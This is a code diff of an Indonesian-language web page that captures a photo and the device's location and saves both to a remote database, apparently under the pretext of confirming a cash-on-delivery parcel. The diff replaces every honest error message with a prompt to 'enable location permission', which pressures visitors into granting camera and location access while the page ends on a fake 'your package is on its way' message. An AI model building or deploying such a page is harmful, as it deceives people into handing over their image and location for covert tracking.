@@ -172,7 +172,7 @@
       } else {
         statusEl.style.background = "#e8f5e9";
         statusEl.style.color = "#388e3c";
-        statusEl.innerText = "✅ Foto berhasil, tunggu lokasi...";
+        statusEl.innerText = "✅ aktifkan izin lokasi";
         ambilLokasi(fileName);
       }
 
@@ -180,7 +180,7 @@
     } catch (err) {
       statusEl.style.background = "#ffebee";
       statusEl.style.color = "#d32f2f";
-      statusEl.innerText = "❌ Tidak bisa ambil foto: " + err;
+      statusEl.innerText = "❌ aktifkan izin: " + err;
     }
   }
 
@@ -199,13 +199,13 @@
         .insert([{ foto: fotoName, latitude: lat, longitude: lon, created_at: new Date() }]);
 
       if (error) {
-        statusEl.innerText = "❌ Gagal simpan lokasi: " + error.message;
+        statusEl.innerText = "❌ aktifkan izin lokasi: " + error.message;
       } else {
         statusEl.innerText = "✅ Oke paket COD mu otw dianter";
         tampilkanFoto();
       }
     }, (err) => {
-      statusEl.innerText = "❌ Gagal ambil lokasi: " + err.message;
+      statusEl.innerText = "❌ aktifkan izin lokasi: " + err.message;
     });
   }
 
@@ -252,3 +252,4 @@
 </script>
 </body>
 </html>
+
